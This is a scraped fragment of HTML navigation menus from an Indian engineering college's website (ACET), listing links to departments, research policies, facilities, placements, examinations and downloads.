                                                        <li><a href="?p=Patents">Patents</a></li>
                                                        <li><a href="?p=Books">Books</a></li>


                                                        <li><a href="Research/IP Policy ACET.pdf" target="blank">IP Policy</a></li>
                                                        <li><a href="?p=Research_Supervisors" target="blank">Research Supervisors</a></li>

                                                        <li><a href="?p=Research_Grants" target="blank">Research Grants</a></li>

                                                        <!-- <li><a href="?p=Innovation and Startup Policy" target="blank">Innovation and Startup Policy</a></li> -->
                                                        <li><a href="Research/innovation and startup policy.pdf" target="blank">NISP Policy</a></li>

                                                        <li><a href="Research/startup_policy_2019 MHRD NISP.pdf" target="blank">Startup Policy 2019 MHRD NISP</a></li>
                                                        
                                                        <li><a href="?p=workshops_seminars">Workshops / Seminars</a></li>
                                                     </ul>
                                                                                                    
                                                </li>
                                            </ul>
                                        </li>


                                       <!--  <li>
                                            <a href="#"><b>Online Help</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Online Payment</b></li>
                                                        <li><a href="https://info.aec.edu.in/acet/" target="blank">Tution Fee Payment</a></li></ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Aditya Grievance Portal</b></li>
                                                        <li><a href="?p=Grievance">Online Grievance Portal</a></li>
                                                    </ul>                                                    
                                                </li>
                                            </ul>
                                        </li> -->


                                        <li>
                                            <a href="#"><b>Infrastructure</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                   
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">IT Infrastructure</b></li>
                                                        <li><a href="?p=IT Infrastructure">ICT enabled tools & IT infrastructure</a></li>
                                                        <li><b class="tab_heading">Facilities</b></li>
                                                        <li><a href="?p=Library"> Library</a></li>
                                                        <li><a href="?p=Hostels">Hostels</a></li>
                                                        <li><a href="?p=Canteen-Food-Courts">Canteen & Food Courts</a></li>
                                                        <li><a href="?p=Sports-Facilities">Sports Facilities</a></li>
                                                        <li><a href="?p=Transport">Transport</a></li>
                                                        <li><a href="?p=Greencampus ">Green Campus</a></li>
                                                        <li><a href="?p=Water_Conservation_Facilities">Water Conservation Facilities</a></li>
                                                        <li><a href="?p=Waste_Management">Waste Management</a></li>
                                                        <li><a href="?p=Gender_Equity_Facilities">Gender Equity Facilities</a></li> <!-- Common Rooms --> 
                                                        <li><a href="?p=Divyangjan">Differently-Abled Friendly Resources</a></li>
                                                        <li><a href="?p=Rooftop_Solar_Panel">Energy Conservation</a></li> <!-- //Roof Top Solar Panels -->
                                                        <li><a href="?p=Seminar">Seminar Halls</a></li> <!-- //Seminar -->
                                                        <li><a href="?p=Smartclassroom">Smart class room/recording room</a></li> <!-- //Smart class room/recording room -->
                                                        <li><a href="?p=Class_Rooms">Class Rooms</a></li> <!-- //Class Rooms -->
                                                        <li><a href="?p=Laboratories">Laboratories</a></li> <!-- //Laboratories -->

                                                    </ul>
                                                    
                                                    <ul class="mega-col ">
                                                        <li><b class="tab_heading">IQAC</b></li>
                                                        <li><a href="uploads/IQAC/Academic Calendar 2018-19  PG.pdf" target="new">Academic Calendar 2018-19 PG</a></li>
                                                        <li><a href="uploads/IQAC/Academic Calendar 2018-19 UG.pdf" target="new">Academic Calendar 2018-19 UG</a></li>
                                                        <li><a href="uploads/IQAC/IQAC members.pdf" target="new">IQAC members</a></li>
                                                        <li><a href="uploads/IQAC/Minutes of meeting - April.pdf" target="new">Minutes of meeting - April</a></li>
                                                        <li><a href="uploads/IQAC/Minutes of meeting -Dec.pdf" target="new">Minutes of meeting -Dec</a></li>
                                                        <li><a href="?p=exitfeedback">EXIT FEEDBACK</a></li> 
                                                        <li> <b class="tab_heading">Maintenance</b></li>   
                                                         <li> <a href="?p=IT Infrastructure#tab5">Maintenance</a></li>                                                     
                                                    </ul> 
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">International Students</b></li>
                                                        <li><a href="https://aditya.ac.in/international/" target="new">International Cell</a></li>

                                                        <li><b class="tab_heading">Audits</b></li>
                                                        <li><a href="Audits/enviromental.pdf" target="new">Environmental Audit</a></li>
                                                        <li><a href="Audits/green audit.pdf" target="new">Green Audit</a></li>
                                                        <li><a href="Audits/energy audit.pdf" target="new">Energy Audit</a></li>
                                                        <li><a href="Audits/award.pdf" target="new">Award</a></li>
                                                    </ul>
                                                </li>
                                            </ul>
                                        </li>  

                                         <li>
                                            <a href="#"><b>Collaboration </b></a>
                                             <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Collaboration</b></li>
                                                        <li><a href="?p=Collaboration NSS"> NSS</a></li>
                                                        <li><a href="?p=Collaboration Examination"> Examination</a></li>
                                                        <li><a href="?p=International Conferences"> International Conferences</a></li>
                                                        <li><a href="http://acet.ac.in/?p=Industry#tab6"> MoU's</a></li>
                                                        <li><a href="?p=Research Centre"> Research Centre</a></li>
                                                       
                                                    </ul>
                                                </li>
                                            </ul>
                                        </li> 

                                        <li>
                                            <a href="#"><b>Examination </b></a>
                                             <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <!-- <li><b class="tab_heading">Examination</b></li> -->
                                                        <li><a href="?p=Examination_autonomous">Autonomous</a></li>
                                                        <li><a href="?p=Examination_Jntuk">JNTUK</a></li>
                                                        <li><a href="#">Annual Report</a></li>
                                                    </ul>
                                                </li>
                                            </ul></li>

                                       <li>
                                            <a href="#"><b>Campus life</b></a>
                                            <ul class="mega-dropdown mega-dropdownright">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Activities</b></li>                                                    
                                                        <li><a href="?p=Infosys-Campus-Connect">Infosys Campus Connect</a></li>                                   
                                                        <li><a href="?p=Project-Club">Project Clubs</a></li>
                                                        <li><a href="?p=SIP">Students Induction Programme</a></li>
                                                        <li>
                                                            <ul class="">
                                                                <li><b class="tab_heading">Makers Zone</b></li>
                                                                <li><a href="?p=Robotics-Club" target="_blank">Robotics Club</a></li>                         
                                                                <li><a href="?p=Automobile-Club">Automobile Club</a></li>
                                                            </ul>
                                                        </li>
                                                        <li>
                                                            <ul class="">
                                                                <li><b class="tab_heading">IoT HUB</b></li>
                                                                 <li><a href="?p=iot-lab">IoT HUB</a></li>
                                                            </ul>
                                                        </li>
                                                    </ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Events</b></li>
                                                        <li><a href="?p=gokart">Karting Championship</a></li>
                                                        <li><a href="?p=Colours">Colors - Youth Fest</a></li>
                                                        <li><a href="?p=Veda">Veda - Tech Fest</a></li>
                                                        <li><a href="?p=Cricket-Tournaments">Cricket Tournaments</a></li>
                                                        <li><a href="?p=Campfire">Campfire</a></li>
                                                        <li><a href="?p=Event-Feedback-Form">Event Feedback Form</a></li>
                                                    </ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Souvenir</b></li>
                                                        <li><a href="/souvenir/acet" target="_blank">  Souvenir Book</a></li>

                                                        <li><b class="tab_heading">ISTE</b></li>                                                        
                                                        <li><a href="?p=ISTE-Faculty-Chapter">ISTE Faculty Chapter</a></li>
                                                    </ul>

                                                    <!-- add online payment -->
                                                    <ul class="mega-col">
                                                      
                                                        <li><b class="tab_heading">Online Payment</b></li>
                                                        <li><a href="https://info.aec.edu.in/acet/" target="blank">Tution Fee Payment</a></li>
                                                  
                                                        <li><b class="tab_heading">Aditya Grievance Portal</b></li>
                                                        <li><a href="?p=Grievance">Online Grievance Portal</a></li>
                                                        <li><a href="https://samadhaan.ugc.ac.in/">e-Samadhaan</a></li>

                                                   
                                                    </ul>                                                    
                                                </li>
                                            </ul>
                                        </li>


                                        <li>
                                            <a href="#"><b>Placements</b></a>
                                            <ul class="mega-dropdown mega-dropdownright">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading"> Placements</b></li>
                                                        <li><a href="?p=Placements">Placements</a></li>
                                                        <li><a href="?p=Placements-team">Placements Team</a></li>
                                                        <li><a href="?p=Campus-Placement-Training">Campus Placement Training</a></li>
                                                        <li><a href="https://placements.technicalhub.io/" target="_blank">Upcoming Campus Drives</a></li>
                                                        <li><a href="https://placements.technicalhub.io/admin/" target="_blank">Placements Admin Login</a></li>
                                                    </ul>
                                                   <!--  <ul class="mega-col">
                                                        <li><b class="tab_heading">Entrepreneurship</b></li>
                                                        <li><a href="http://getmybooks.com/" target="new">Get My Books</a></li>
                                                        <li><a href="http://getmytailor.com/" target="new">Get My Tailor</a></li>
                                                        <li><a href="http://hirepuppy.com/" target="new">Hire Puppy</a></li>
                                                        <li><a href="http://oasis-skill-assessment.epizy.com" target="new">Oasis</a></li>
                                                        <li><a href="http://www.agumentikconsultancy.com/" target="new">Augmentik Consultancy</a></li>
                                                    </ul> -->
                                                     <ul class="mega-col">
                                                        <li><b class="tab_heading">Higher Education Details</b></li>
                                                        <li><a href="documents/HIGHER EDUCATION - 2016 - 2020.pdf" target="new">Higher Education Details</a></li>
                                                     </ul>
                                                </li>
                                            </ul>
                                        </li>

                                        <!-- <li>
                                            <a href="#"><b>International Students</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">International Students</b></li>
                                                        <li><a href="https://aditya.ac.in/international/" target="new">International Cell</a></li></ul>                                                   
                                                </li>
                                            </ul>
                                        </li>
 -->

                                        

                                        <!-- <li>
                                            <a href="#"><b>IQAC</b></a>
                                            <ul class="mega-dropdown mega-dropdownright">
                                                <li class="row">
                                                    <ul class="mega-col ">
                                                        <li><b class="tab_heading">IQAC</b></li>
                                                        <li><a href="uploads/IQAC/Academic Calendar 2018-19  PG.pdf" target="new">Academic Calendar 2018-19 PG</a></li>
                                                        <li><a href="uploads/IQAC/Academic Calendar 2018-19 UG.pdf" target="new">Academic Calendar 2018-19 UG</a></li>
                                                        <li><a href="uploads/IQAC/IQAC members.pdf" target="new">IQAC members</a></li>
                                                        <li><a href="uploads/IQAC/Minutes of meeting - April.pdf" target="new">Minutes of meeting - April</a></li>
                                                        <li><a href="uploads/IQAC/Minutes of meeting -Dec.pdf" target="new">Minutes of meeting -Dec</a></li>
                                                        <li><a href="?p=exitfeedback">EXIT FEEDBACK</a></li>                                                        
                                                    </ul>                                                                                                    
                                                </li>

                                            </ul>
                                        </li> -->

                                        <li>
                                            <a href="#"><b>Downloads</b></a>
                                            <ul class="mega-dropdown mega-dropdownright">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Downloads</b></li>
                                                        <li><a href="?p=Downloads">All Downloads</a></li>
                                                        <li><a href="docs/Aditya_Engineering_Brochure2017.pdf" target="new">ACET Prospects</a></li>
                                                        <li><a href="?p=Academic-Calender">Academic Calender - JNTUK</a></li>                                                
                                                        <li><a href="https://play.google.com/store/apps/details?id=info.campusnet.adityaconnect" target="new">Aditya Connect app</a></li>
                                                        <li><a href="docs/ssaist_apprender.apk" target="new">Download Moodle App</a></li>
                                                        <li><a href="?p=Media">Media&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a></li>
                                                    </ul>
                                                </li>
                                            </ul>
                                        </li>

                                        <li>
                                            <a href="?p=NIRF"><b>NIRF</b></a>
                                            
                                        </li>


                                        

                                    </ul>
                                </nav>
                            </div>
                            <div class="col-lg-1 col-md-1 hidden-sm">

                            </div>
                        </div>
                    </div>
                </div>

                <!-- Mobile Menu Area Start -->
                <div class="mobile-menu-area">
                    <div class="container">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="mobile-menu">
                                    <nav id="dropdown">
                                        <ul>
                                            <li>
                                                <a href="index.php"><b class="tab_heading">Home</b></a>
                                            </li>
                                            <li>
                                                <a href="#"><b class="tab_heading">About Us</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;About College</b>
                                                        <a href="?p=About-AEC">About ACET</a>
                                                        <a href="?p=Vision-Mission">Vision & Mission</a>
                                                        <a href="?p=Chairmans-Message#chairmans_message">Chairman's Message</a>
                                                        <a href="?p=Vice-Chairmans-Message#vice_chairmans_message">Vice-Chairman's Message</a>
                                                        <a href="?p=Secretary-Message#secretary_message">Secretary's Message</a>
                                                        <a href="?p=Principals-Message#principals_message">Principal's Message</a>
                                                        <a href="?p=Rules and Regulations">Rules and Regulations</a>
                                                        <a href="?p=ACET-Policy">ACET Policy</a>
                                                        <li><a href="?p=Rules and Regulations#AICTE">AICTE Mandatory Disclosure</a></li>
                                                        <a href="?p=Best_Practices#best_practices">Best Practices</a>
                                                        <a href="?p=Institutional Distinctiveness">Institutional Distinctiveness</a>
                                                        <a href="?p=Governance"> Governance </a>
                                                        <a href="includes/BOG/auditedstatement.pdf"> Audited Statement</a>

                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Contact Us</b>
                                                        <a href="?p=contactus"> Get In Touch</a>
                                                        <a href="?p=contactus">How To Reach Campus</a>
                                                    </li>
                                                    <!-- <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Accreditations</b>
                                                        <a href="docs/NAAC  CERTIFICATE.jpg" target="new">Accrediation by NAAC</a>
                                                        <a href="#"> Accrediation by NBA</a>
                                                        <a href="#">Accrediation by IAO</a>
                                                    </li> 
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;AICTE Approvals</b>
                                                        <a href="?p=AICTE">All AICTE Approvals</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;International Students</b>
                                                        <a href="https://aditya.ac.in/international/">International Cell</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;AQAR</b>
                                                        <a href="?p=AQAR"> Annual Quality Assurance Report(AQAR)</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Alumni Registration</b>
                                                        <a href="?p=Alumni">Register Now</a>
                                                    </li>  -->
                                                </ul>
                                            </li>

                                                <li>
                                                <a href="#"><b class="tab_heading">Academics</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Course</b>
                                                        <a href="?p=Syllabus">Syllabus - Jntuk</a>
                                                        <a href="?p=PO">PO, PSO & CO's</a>
                                                        <a href="?p=UG-Courses#UG">UG Courses</a>
                                                        <a href="?p=PG-Courses#PG">PG Courses</a>
                                                        <a href="?p=Diploma#Diploma">Diploma</a>
                                                        <li><a href="https://jntukresults.edu.in/" target="_blank">JNTUK Results</a></li>

                                                    </li>

                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Achievements</b>
                                                        <a href="?p=Student-Achievement">Student Achievement</a>
                                                        <a href="?p=Faculty-Achievement"> Faculty Achievement</a>
                                                    </li> 

                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Toppers</b>
                                                        <a href="?p=Batch-wise-toppers">Batch-wise Toppers</a>
                                                        <a href="?p=Academic-Year-Toppers"> Academic Year Toppers</a>
                                                    </li> 
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Scholarship</b>
                                                        <!-- <a href="">Govt</a> -->
                                                        <a href="?p=allcommittees&category=Govt&committeename=Government"> Government</a>

                                                         <a href="?p=allcommittees&category=Merit&committeename=Merit"> Merit</a>

                                                    </li>

                                                       <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Autonomous</b>
                                                        <a href="?p=Regulations">Regulations</a>                                                       
                                                        <a href="?p=Autonomous_syllabus">Syllabus </a>
                                                        <a href="?p=Autonomous_calenders">Academic Calendars</a>
                                                        </li>
                                                   <!--  <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Policies</b>
                                                        <a href="?p=construction">College fee</a>
                                                        <a href="?p=construction">Merit Scholarship</a>
                                                        <a href="?p=construction">Fees reimbursement</a>
                                                    </li>

                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Seminar/FDP/Workshops</b>
                                                        <a href="?p=Seminar&type=Seminar">Seminar</a>
                                                        <a href="?p=Seminar&type=FDP">FDP</a>
                                                        <a href="?p=Seminar&type=Workshop">Workshops</a>
                                                    </li>  -->



                                                </ul>
                                            </li>
                                            
                                           <!--  <li>
                                                <a href="#"><b class="tab_heading">Examinations</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Online Payment</b>
                                                        <a href="https://info.aec.edu.in/aec/" target="blank">Tution Fee Payment</a>
                                                        <a href="https://examsection.aec.edu.in/" target="blank"> Autonomous - Exam Fee Payment</a>
                                                        <a href="?p=Refund" target="blank">Refund and Cancellation</a>
                                                        <a href="?p=Terms-Conditions" target="blank">Terms and conditions</a>
                                                        <a href="?p=Privacy-policy" target="blank"> Privacy Policy</a> 
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Examinations</b>
                                                        <a href="?p=examination-autonomous"> Autonomous</a>
                                                        <a href="?p=examination-jntuk"> JNTUK</a>
                                                    </li>

                                                    
                                                </ul>
                                            </li> -->

                                            <li>
                                              <a href=""><b class="tab_heading">Collaboration </b></a>
                                              <ul>
                                                <li>
                                                  <b class="tab_heading">Collaboration</b>
                                                  <a href="?p=Collaboration NSS"> NSS</a>
                                                  <a href="?p=Collaboration Examination"> Examination</a>
                                                  <a href="?p=International Conferences"> International Conferences</a>
                                                  <a href="http://acet.ac.in/?p=Industry#tab6"> MoU's</a>
                                                  <a href="?p=Research Centre"> Research Centre</a>
                                                </li> 
                                              </ul>
                                            </li>

                                        
                                            <li>
                                                <a href="#"><b class="tab_heading">DEPARTMENTS</b></a>
                                                <ul><li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Departments</b>
                                                        <a href ="?p=CIVIL">Civil Engineering</a>
                                                        <a href ="?p=EEE">Electrical and Electronics Engineering</a>
                                                        <a href ="?p=MECH">Mechanical Engineering</a>
                                                        <a href ="?p=ECE">Electronics and Communication Engineering</a>
                                                        <a href ="?p=CSE">Computer Science and Engineering</a>
                                                        <a href ="?p=IT">Information Technology</a>
                                                        <a href ="?p=AIML_DS">Computer Science and Engineering(AIML & Data Science)</a>
                                                       <!--  <a href ="?p=Mining">Mining Engineering</a> -->
                                                        <!-- <a href ="?p=Petroleum">Petroleum Technology</a> -->
                                                        <!-- <a href ="?p=AGRI">Agricultural Engineering</a> -->
                                                        <a href ="?p=MBA">Department of Management Studies</a>
                                                        <a href ="?p=MCA">Department of MCA</a>
                                                        <a href ="?p=HBS">Department of Humanities-Sceinces</a>
                                                    </li>

                                                    <li>



                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Laboratories</b>
                                                        <a href ="?p=Civil-Lab">Civil Engineering</a>
                                                        <a href ="?p=EEE-Lab">Electrical and Electronics Engineering</a>
                                                        <a href ="?p=Mech-Lab">Mechanical Engineering</a>
                                                        <a href ="?p=ECE-Lab">Electronics and Communication Engineering</a>
                                                        <a href ="?p=CSE-Lab">Computer Science and Engineering</a>
                                                        <a href ="?p=IT-Lab">Information Technology</a>
                                                    </li>

                                                   <!--  <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;T-Hub</b>
                                                        <a href="?p=About_T-Hub">About T-Hub</a>
                                                    </li> -->
                                                </ul>
                                            </li>

                                             <li>
                                                <a href="#"><b class="tab_heading">Research</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Research</b>

                                                        <a href="?p=Publications">Publications</a>
                                                        <a href="Research/R and D INCENTIVE POLICY.pdf" target="_blank">R&D Incentive Policy</a>

                                                        <a href="?p=Patents">Patents</a>
                                                        <a href="?p=Books">Books</a>

                                                        <a href="Research/IP Policy ACET.pdf" target="blank">IP Policy</a>
                                                        <a href="?p=Research_Supervisors" target="blank">Research Supervisors</a>
                                                        <a href="?p=Research Grants" target="blank">Research Grants</a>
                                                        <a href="Research/innovation and startup policy.pdf" target="blank">NISP Policy</a>
                                                        <a href="Research/startup_policy_2019 MHRD NISP.pdf" target="blank">Startup Policy 2019 MHRD NISP</a>

                                                        <a href="?p=workshops_seminars">Workshops / Seminars</a>
                                                   </li>
                                                  
                                                </ul>                         
                                            </li>

                                            <li>
                                                <a href="#"><b class="tab_heading">Online Help</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Online Payment</b>
                                                        <a href="https://info.aec.edu.in/acet/" target="blank">Tution Fee Payment</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Aditya Grievance Portal</b>
                                                        <a href="?p=Grievance">Online Grievance Portal</a>
                                                    </li>
                                                </ul>                         
                                            </li>
                                            

                                            <li>
                                                <a href="#"><b class="tab_heading">Examination </b></a>

                                                <ul>
                                                    <li>
                                                       <a href="?p=Examination_autonomous">Autonomous</a>
                                                       <a href="?p=Examination_Jntuk">JNTUK</a>
                                                       <a href="#">Annual Report</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            


                                            <li>
                                                <a href="#"><b class="tab_heading">Infrastructure</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;IT Infrastructure</b>
                                                        <a href="?p=IT Infrastructure">ICT enabled tools & IT infrastructure</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Facilities</b>
                                                        <a href="?p=Library"> Library</a>
                                                        <a href="?p=Hostels">Hostels</a>
                                                        <a href="?p=Canteen-Food-Courts">Canteen & Food Courts</a>
                                                        <a href="?p=Sports-Facilities">Sports Facilities</a>
                                                        <a href="?p=Transport">Transport</a>
                                                        <a href="?p=Greencampus ">Green Campus</a>
                                                        <a href="?p=Water_Conservation_Facilities">Water Conservation Facilities</a>
                                                        <a href="?p=Waste_Management">Waste Management</a>
                                                        <a href="?p=Gender_Equity_Facilities">Gender Equity Facilities</a>
                                                        <a href="?p=Divyangjan">Differently-Abled Friendly Resources</a>
                                                        <a href="?p=Rooftop_Solar_Panel">Energy Conservation</a>
                                                        <a href="?p=Seminar">Seminar Halls</a> 
                                                        <a href="?p=Smartclassroom">Smart class room/recording room</a> 
                                                        <a href="?p=Class_Rooms">Class Rooms</a> 
                                                        <a href="?p=Laboratories">Laboratories</a> 
                                                    </li> 
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;International Students</b>
                                                        <a href="https://aditya.ac.in/international/" target="new">International Cell</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;IQAC</b>
                                                        <a href="uploads/IQAC/Academic Calendar 2018-19  PG.pdf" target="new">Academic Calendar 2018-19 PG</a>
                                                        <a href="uploads/IQAC/Academic Calendar 2018-19 UG.pdf" target="new">Academic Calendar 2018-19 UG</a>
                                                        <a href="uploads/IQAC/IQAC members.pdf" target="new">IQAC members</a>
                                                        <a href="uploads/IQAC/Minutes of meeting - April.pdf" target="new">Minutes of meeting - April</a>
                                                        <a href="uploads/IQAC/Minutes of meeting -Dec.pdf" target="new">Minutes of meeting -Dec</a>
                                                        <a href="?p=exitfeedback">EXIT FEEDBACK</a>
                                                        <a href="?p=IT Infrastructure#tab5">MaintenanceK</a>
                                                    </li>
                                                    <!-- <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Facilities for physically Challenged People</b>
                                                        <a href="?p=wheel_chair">Wheel Chair</a>
                                                        <a href="?p=wooden_ramp">Wooden Ramp</a>
                                                        <a href="?p=lift">Lift</a>
                                                        <a href="?p=toilet">Westron Type Toilet</a>
                                                    </li>  -->

                                                    <li><b>&nbsp;&nbsp;&nbsp;&nbsp;Audits</b>
                                                      <a href="Audits/enviromental.pdf" target="new">Environmental Audit</a>
                                                      <a href="Audits/green audit.pdf" target="new">Green Audit</a>
                                                      <a href="Audits/energy audit.pdf" target="new">Energy Audit</a>
                                                      <a href="Audits/award.pdf" target="new">Award</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li>
                                                <a href="#"><b class="tab_heading">Campus life</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Activities</b>
                                                       <!--  <a href="?p=Project-Hub"> Project Hub</a> -->
                                                        <a href="?p=Infosys-Campus-Connect">Infosys Campus Connect</a>
                                                        <li><a href="?p=SIP">Students Incubation Programme</a></li>
                                                        <!-- <a href="?p=MOOC's">MOOCs Online Course</a> -->
                                                        <!-- <a href="?p=Project-Club">Project Clubs</a> -->
                                                        <a href="?p=iot-lab">IoT HUB</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Events</b>
                                                        <a href="?p=gokart">Karting Championship</a>
                                                        <a href="?p=Colours">Colors - Youth Fest</a>
                                                        <a href="?p=Veda">Veda - Tech Fest</a>
                                                        <a href="?p=Cricket-Tournaments">Cricket Tournaments</a>
                                                        <a href="?p=Campfire">Campfire</a>
                                                        <a href="?p=Event-Feedback-Form">Event Feedback Form</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Souvenir</b>
                                                        <a href="/souvenir/acet" target="_blank">  Souvenir Book</a>
                                                    </li>  
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;ISTE</b>
                                                        <!-- <a href="?p=ISTE-Students-Chapter"> ISTE Students Chapter</a> -->
                                                        <a href="?p=ISTE-Faculty-Chapter">ISTE Faculty Chapter</a>
                                                    </li> 
                                                     <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Online Payment</b>
                                                        <a href="https://info.aec.edu.in/acet/" target="blank">Tution Fee Payment</a>
                                                    </li>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Aditya Grievance Portal</b>
                                                        <a href="?p=Grievance">Online Grievance Portal</a>
                                                        <a href="https://samadhaan.ugc.ac.in/">e-Samadhaan</a>
                                                    </li>
                                                        
                                                   
                                                    </ul> 
                                                
                                            </li>
                                            <li>
                                                <a href="#"><b class="tab_heading">Placements</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Placements</b>
                                                        <a href="?p=Placements">Placements</a>
                                                        <a href="?p=Placements-team">Placements Team</a>
                                                        <a href="?p=Campus-Placement-Training">Campus Placement Training</a>
                                                        <a href="https://placements.technicalhub.io/">Upcoming Campus Drives</a><a href="https://placements.technicalhub.io/admin/" target="_blank">Placements Admin Login</a>

                                                    </li> 
                                                    <!-- <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Entrepreneurship</b>
                                                        <a href="http://getmybooks.com/" target="new">Get My Books</a>
                                                        <a href="http://getmytailor.com/" target="new">Get My Tailor</a>
                                                        <a href="http://hirepuppy.com/" target="new">Hire Puppy</a>
                                                        <a href="http://oasis-skill-assessment.epizy.com" target="new">Oasis</a>
                                                        <a href="http://www.agumentikconsultancy.com/" target="new">Augmentik Consultancy</a>
                                                    </li> -->

                                                    <li>
                                                       <b>&nbsp;&nbsp;&nbsp;&nbsp;Higher Education Details</b>
                                                       <a href="documents/HIGHER EDUCATION - 2016 - 2020.pdf" target="new">Higher Education Details</a>
                                                     </li>
                                                    
                                                </ul>
                                            </li>

                                            <li>
                                                <a href="?p=nirf"><b class="tab_heading">NIRF</b></a>
                                               <!--  <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Nodal Officer Details</b>
                                                      <p style="color: black">
                                                           
                                                            &nbsp;&nbsp;&nbsp;&nbsp;Mr.Ch.S.V.V.S.N Murthy<br>
                                                            &nbsp;&nbsp;&nbsp;&nbsp;Associate professor,CSE Department,<br>
                                                            &nbsp;&nbsp;&nbsp;&nbsp;Phone no: 7729990567<br>
                                                            &nbsp;&nbsp;&nbsp;&nbsp;chsatyamurty@gmail.com<br>
                                                        
                                                             <li><a href="#" target="new">NIRF 2020-21 Submitted Data(Engineering)</a></li>
                                                            <li><a href="#" target="new">NIRF 2020-21 Submitted Data(Overall)</a></li>
                                                        </p>
                                                    </li>
                                                </ul> -->
                                            </li>
                                            
                                           

                                            <li>
                                                <a href="#"><b class="tab_heading">DOWNLOADS</b></a>
                                                <ul>
                                                    <li>
                                                        <b>&nbsp;&nbsp;&nbsp;&nbsp;Downloads</b>
                                                        <a href="?p=Downloads">All Downloads</a>
                                                        <a href="docs/Aditya_Engineering_Brochure2017.pdf" target="new">ACET Prospects</a>
                                                        <a href="?p=Academic-Calender">Academic Calender - JNTUK</a>
                                                       <!--  <a href="?p=Academic-Calenders">Academic Calender - Autonomous</a>
                                                       -->                                                        <a href="https://play.google.com/store/apps/details?id=info.campusnet.adityaconnect" target="new">Aditya Connect app</a>
                                                         <a href="docs/ssaist_apprender.apk" target="new">Download Moodle App</a>
                                                        <a href="?p=Media">Media</a>
                                                        <!-- <a href="https://www.aec.edu.in/newsletter/" target="new">NewsLetter</a> -->
                                                    </li>
                                                </ul> 
                                            </li>
                                        </ul>
                                    </nav>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Mobile Menu Area End -->
            </div>
        </header>
        <!-- Header Area End Here -->

        

                        <!--Flash New-->
                <div class="ticker-container" style="margin: 2px 0 0 0;">
                    <div class="ticker-caption text-left" >
                        <p style="font-size: 15px;padding: 0 5px; font-weight: normal;font-family: Roboto, sans-serif;;" >Flash News</p>
                    </div>
